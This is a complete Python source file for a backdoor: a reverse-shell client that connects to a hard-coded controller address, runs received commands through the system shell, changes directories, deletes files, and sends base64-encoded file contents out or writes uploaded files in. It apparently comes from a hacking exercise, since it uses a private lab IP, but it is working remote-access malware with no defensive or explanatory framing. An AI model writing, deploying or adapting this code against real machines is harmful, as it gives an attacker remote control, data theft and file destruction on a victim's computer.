#!/usr/bin/env python
import socket , subprocess , json
import os , base64

class Backdoor :
    def __init__(self,ip,port) :
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
    
    def send_data(self,data) :
        data_ser=json.dumps(data)
        self.connection.send(data_ser)

    def recv_data(self):
        json_data=self.connection.recv(1024)
        data=json.loads(json_data)
        return data
    def exec_command(self,command):
        if command[0]=="exit" :
            self.connection.close()
            exit()
        elif command[0] == "cd" :
            os.chdir(command[1])
            return ""
        elif command[0] == "rm" or command[0] == "del" :
            os.remove(command[1]) 
            return ""   
        elif command[0]=="download" :
            with open(command[1],"rb") as file :
                content=file.read()
            return base64.b64encode(content)
        elif command[0] == "upload" :
            self.write_file(command[1],command[2])
            return "[+] "+command[1] +" uploaded successfully !"     
        else :    
            return subprocess.check_output(command,shell=True)

    def write_file(self,path,content) :
        with open(path,"wb") as file :
            file.write(base64.b64decode(content))

    def run(self) :
        while True :
            try :
                command=self.recv_data() 
                result=self.exec_command(command)
            except Exception :
                result="[-] Error during Execution"    
            self.send_data(result)
        self.connection.close()     
my_backdoor=Backdoor("192.168.111.129",1234)
my_backdoor.run()